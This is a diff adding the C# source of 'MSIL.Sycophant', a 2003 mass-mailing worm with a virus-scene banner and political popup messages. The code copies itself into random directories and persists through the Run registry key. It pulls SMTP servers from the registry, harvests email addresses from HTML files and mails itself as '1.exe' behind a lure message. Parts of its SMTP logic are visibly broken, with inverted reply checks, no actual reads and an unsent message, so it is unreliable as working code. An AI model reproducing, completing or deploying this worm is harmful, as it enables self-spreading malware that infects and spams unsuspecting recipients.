@@ -1,0 +1,270 @@
+					   
+					  _             
+                     |_)  _ _|_  ._  _ 
+                     | \ (/_ |_  |  (_)              www.pugnax.co.uk
+					*************************************************
+					**               MSIL.Sycophant                **
+					**        (Worm/JativCS.A , W32/Letum.C)       **
+					**               September 2003                **
+					*************************************************
+						          Anarchistic Sadistic
+
+                    using System;
+                    using System.Collections;
+                    using System.ComponentModel;
+                    using System.Data;
+                    using System.Drawing;
+                    using System.IO;
+                    using System.Net.Sockets;
+                    using System.Text;
+                    using System.Text.RegularExpressions;
+                    using System.Windows.Forms;
+                    using System.Reflection;
+                    using System.Threading;
+                    using Microsoft.Win32;
+                    using Retro.Balloon;
+                     
+                    namespace Sycophant {
+                        public partial class Form1 : Form {
+                            static Module sycophant;
+                            static ArrayList fds = new ArrayList();
+                            static string[] htmlFiles;
+                            TaskbarNotifier balloonPopup;
+                     
+                            static string[] popTitle = new string[9] {
+                                    "Retro/rRlf", "Capitalism", "Anarchy",
+                                    "Peter Ferrie", "Class War", "Tony \"Bliar\" must go.",
+                                    "British National Party", "UK Police", "Sycophant"
+                            };
+                     
+                            static string[] popMsg = new string[9] {
+                                    "http://retro.host.sk", "Kill the fat cats", "The British government is corrupt!",
+                                    "Have fun!", "No war but the class war", "Stop Labour before its too late",
+                                    "Only losers support the BNP", "Fuck the Fascists", "by Retro, England"
+                            };
+                     
+                            public Form1()
+                            {
+                                InitializeComponent();
+                     
+                                balloonPopup = new TaskbarNotifier();
+                                balloonPopup.SetBackgroundBitmap(new Bitmap(GetType(), "skin.bmp"), Color.FromArgb(255, 0, 255));
+                                balloonPopup.SetCloseBitmap(new Bitmap(GetType(), "close.bmp"), Color.FromArgb(255, 0, 255), new Point(280, 57));
+                                balloonPopup.TitleRectangle = new Rectangle(150, 57, 125, 28);
+                                balloonPopup.ContentRectangle = new Rectangle(75, 92, 215, 55);
+                     
+                                Thread smtpThread = new Thread(new ThreadStart(smtp));
+                                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\International", false);
+                                object c = key.GetValue("sCountry");
+                     
+                                if (c.ToString() == "United Kingdom")
+                                {
+                                    Random rand = new Random();
+                     
+                                    sycophant = Assembly.GetExecutingAssembly().GetModules()[0];
+                     
+                                    string[] ehd = Directory.GetLogicalDrives();
+                     
+                                    foreach (string hd in ehd)
+                                    {
+                                        Collect(hd, fds);
+                                    }
+                     
+                                    int n = rand.Next(0, fds.Count);
+                                    string rf = fds[n].ToString() + @"\" + sycophant.ScopeName;
+                     
+                                    key = Registry.CurrentUser.OpenSubKey(@"Software\Retro", true);
+                     
+                                    if (key == null)
+                                    {
+                                        key = Registry.CurrentUser.CreateSubKey(@"Software\Retro");
+                                        key.SetValue("Sycophant", rf);
+                                        File.Copy(sycophant.FullyQualifiedName, rf);
+                                    }
+                     
+                                    object rd = key.GetValue("Sycophant");
+                                    File.Delete(rd.ToString());
+                                    File.Copy(sycophant.FullyQualifiedName, rf);
+                     
+                                    key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                                    key.SetValue("Sycophant", rf);
+                                    key.Close();
+                     
+                                    smtpThread.Start();
+                                    popTimer.Start();
+                                }
+                            }
+                     
+                            static void Collect(string dir, ArrayList storage)
+                            {
+                                try
+                                {
+                                    string[] dirs = Directory.GetDirectories(dir);
+                     
+                                    foreach (string d in dirs)
+                                    {
+                                        storage.Add(d);
+                                        Collect(d, storage);
+                                    }
+                                }
+                                catch (System.UnauthorizedAccessException) { }
+                            }
+                     
+                            private void popTimer_Tick(object sender, EventArgs e)
+                            {
+                                Random rnd = new Random();
+                                int i = rnd.Next(popMsg.Length);
+                                balloonPopup.CloseClickable = true;
+                                balloonPopup.TitleClickable = false;
+                                balloonPopup.ContentClickable = false;
+                                balloonPopup.EnableSelectionRectangle = true;
+                                balloonPopup.KeepVisibleOnMousOver = true;
+                                balloonPopup.ReShowOnMouseOver = true;
+                                balloonPopup.Show(popTitle[i], popMsg[i], 500, 5000, 500);
+                            }
+                     
+                            static void smtp()
+                            {
+                                TcpClient smtp = new TcpClient();
+                                StringBuilder b64String = new StringBuilder();
+                                Random rand = new Random();
+                     
+                                object smtpServer = null;
+                                int smtpCursor = 0;
+                                string smReply, boundary = Guid.NewGuid().ToString().Replace("-", "");
+                                string emailBody = "<html><head><title></title></head><body bgcolor=\"white\" text=\"black\"><p>&nbsp;<div align=\"center\"><table border=\"0\" cellpadding=\"2\" width=\"80%\"><tr><td width=\"971\"><p><font face=\"Verdana\" size=\"4\"><b>Corruption UK</b></font></td></tr><tr><td width=\"971\"><p><font face=\"Verdana\" size=\"2\"><br>Dear user,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Over the last eight years, nothing has been done about the corruption in our government and police force. &nbsp;We need to act now, before its to late! We need your help to fight this and in return we hope to make the UK a better place for ourselfs and for the our children.&nbsp;Act now while we still can or forever live in fear from the fat cats who run it.</font></p><p><font face=\"Verdana\" size=\"2\">Sycophant</font></td></tr></table></div><p>&nbsp;</p></body></html>";
+                     
+                                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Account Manager");
+                     
+                                string[] smtpDirs = key.GetSubKeyNames();
+                     
+                                foreach (string smtpKey in smtpDirs)
+                                {
+                                    RegistryKey smtpSubKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Account Manager\" + smtpKey, true);
+                                    object Server = smtpSubKey.GetValue("SMTP Server");
+                     
+                                    if (Server == null)
+                                    {
+                                        smtpServer = "mail.airmail.net";
+                                        continue;
+                                    }
+                                    else
+                                    {
+                                        smtpServer = smtpSubKey.GetValue("SMTP Server");
+                                    }
+                                }
+                     
+                                key = Registry.CurrentUser.OpenSubKey(@"Software\Retro", true);
+                                object hp = key.GetValue("Sycophant");
+                     
+                                FileStream ftB64 = new FileStream(hp.ToString(), FileMode.Open, FileAccess.Read);
+                                byte[] bA = new byte[ftB64.Length];
+                                int rb = ftB64.Read(bA, 0, (int)ftB64.Length);
+                                ftB64.Close();
+                     
+                                string b64Enc = Convert.ToBase64String(bA);
+                     
+                                while (smtpCursor < b64Enc.Length)
+                                {
+                                    int Size = Math.Min(76, b64Enc.Length - smtpCursor);
+                                    b64String.Append(b64Enc, smtpCursor, Size);
+                                    b64String.Append("\r\n");
+                                    smtpCursor += Size;
+                                }
+                     
+                                smtp.Connect((string)smtpServer, 25);
+                     
+                                NetworkStream smtpStream = smtp.GetStream();
+                                StreamReader smtpReader = new StreamReader(smtp.GetStream());
+                                StreamWriter smtpWriter = new StreamWriter(smtpStream);
+                                smtpWriter.AutoFlush = true;
+                     
+                                smReply = smtpReader.ToString();
+                     
+                                if (smReply.Substring(0, 3) != "220")
+                                {
+                                    smtpWriter.WriteLine("HELO localhost\r\n");
+                                    smReply = smtpReader.ToString();
+                     
+                                    if (smReply.Substring(0, 3) != "250")
+                                    {
+                                        try
+                                        {
+                                            foreach (string cds in fds)
+                                            {
+                                                htmlFiles = Directory.GetFiles(cds, "*.html" );
+                                            }
+                     
+                                            foreach (string htmlFile in htmlFiles)
+                                            {
+                                                Regex hRegex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-0]+");
+                     
+                                                FileStream iF = new FileStream(htmlFile, FileMode.Open, FileAccess.Read);
+                     
+                                                byte[] source = new byte[iF.Length];
+                                                iF.Read(source, 0, (int)iF.Length);
+                                                iF.Close();
+                     
+                                                foreach (Match strMatch in hRegex.Matches(Encoding.ASCII.GetString(source)))
+                                                {
+                                                    smtpWriter.WriteLine("MAIL FROM: sycophant@gmail.com");
+                                                    smReply = smtpReader.ToString();
+                     
+                                                    if (smReply.Substring(0, 3) != "250")
+                                                    {
+                                                        smtpWriter.WriteLine("DATA");
+                                                        smReply = smtpReader.ToString();
+                     
+                                                        if (smReply.Substring(0, 3) != "354")
+                                                        {
+                                                            string mime = "FROM:<sycophant@gmail.com> sycophant@gmail.com\r\n"
+                                                                        + "TO: <" + strMatch + ">" + strMatch + "\r\n"
+                                                                        + "SUBJECT: 2\r\n"
+                                                                        + "MIME-Version: 1.0\r\n"
+                                                                        + "Content-Type: multipart/mixed;\r\n\t"
+                                                                        + "bounday=" + boundary + "\""
+                                                                        + "X-Priority: 3\r\n"
+                                                                        + "X-MSMail-Priority: Normal\r\n"
+                                                                        + "X-Mailer: Microsoft Outlook Express 6.00.2900.2180\r\n"
+                                                                        + "X-MineOLE: Produced By Microsoft MimeOLE V6.00.2900.2180\r\n\r\n"
+                                                                        + "This is a multi-part message in MIME format.\r\n"
+                                                                        + "--" + boundary + "\r\n"
+                                                                        + "Content-Type: text/html;\r\n\t"
+                                                                        + "charset\"iso-8859-1\"\r\n"
+                                                                        + "Content-Transfer-Encoding: 7bit\r\n\r\n"
+                                                                        + emailBody + "\"\r\n--" + boundary + "\r\n"
+                                                                        + "Content-Type: application/octet-stream;\r\n\t"
+                                                                        + "name=\"1.exe\"\r\n"
+                                                                        + "Content-Transfer-Encdoing: base64\r\n"
+                                                                        + "Content-Disposition: attachment;\r\n\t"
+                                                                        + "filename=\"1.exe\"\r\n\r\n" + b64String + "\r\n\r\n"
+                                                                        + "--" + boundary + "--\r\n.\r\n";
+                     
+                                                            smReply = smtpReader.ToString();
+                     
+                                                            if (smReply.Substring(0, 3) != "250")
+                                                            {
+                                                                continue;
+                                                            }
+                                                            else
+                                                            {
+                                                                int l = 0;
+                     
+                                                                if (l < 5)
+                                                                {
+                                                                    smtp.Close();
+                                                                    Sycophant.Form1.smtp();
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        }
+                                        catch (System.UnauthorizedAccessException) { }
+                                    }
+                                }
+                                smtp.Close();
+                            }
+                        }
+                    }
